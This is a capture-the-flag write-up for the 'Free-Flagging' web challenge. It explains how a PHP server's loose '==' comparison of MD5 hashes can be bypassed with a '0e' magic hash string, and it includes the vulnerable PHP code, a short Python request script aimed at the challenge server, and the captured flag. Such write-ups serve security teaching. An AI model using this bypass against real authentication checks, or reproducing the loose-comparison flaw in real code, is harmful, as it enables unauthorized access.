# Free-Flagging

## Challenge Summary

- **Category**: Web
- **Points**: 75
- **Solves**: 125 teams

---

### Problem Description

> "You reached Free Parking" - sadly we ran out of money, but here have a free flag instead.

---

## Challenge Structure

- The server accepts `POST` requests and compares the `md5` hash of the provided input with the `md5` hash of the flag.
- If they match using `==`, the server returns the flag.
- The key vulnerability here is how PHP's `==` operator performs loose comparison.

---

## Exploitation Flow

### Step 1: Bypassing with PHP loose comparison

The vulnerability lies in how PHP performs comparisons using the `==` operator.

Here’s the relevant part of the server code:

```php
<?php
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    highlight_file(__FILE__);
    exit;
}

$flag = getenv("FLAG");
$guess = file_get_contents('php://input');

// Check if user knows the flag
if (md5($flag) == md5($guess)) {
    echo("You correctly guessed the flag - " . $flag);
} else {
    echo("You guessed wrong: The flags hash is " . md5($flag) . " and the hash of your guess is " . md5($guess));
}
?>
```

PHP uses **loose comparison (`==`)**, which means it performs type juggling.  
If both `md5($flag)` and `md5($guess)` start with `"0e..."`, PHP interprets them as scientific notation floats like `0e12345`, resulting in `true` even if the strings differ.

---

### Step 2: Finding a magic string

We can use a known magic string like `"QNKCDZO"` whose `md5` hash starts with `"0e..."` and triggers the loose comparison:

```php
md5("QNKCDZO") = "0e830400451993494058024219903391"
```

This means that `md5($flag) == md5($guess)` can return `true` even if the strings are different.

---

### Step 3: Exploiting the server

With the magic string identified ("QNKCDZO"), we simply send a POST request to the server using that value as the body. Since the hash comparison evaluates to true, the server returns the actual flag.

Python exploit script:

```python
import requests

url = "https://grandtown-of-charged-liberty.gpn23.ctf.kitctf.de/"
magic = "QNKCDZO"

print(requests.post(url, data=magic).text)
```

---

## Flag

```
You correctly guessed the flag - GPNCTF{just_php_d01ng_php_th1ng5_abM2zz}
```
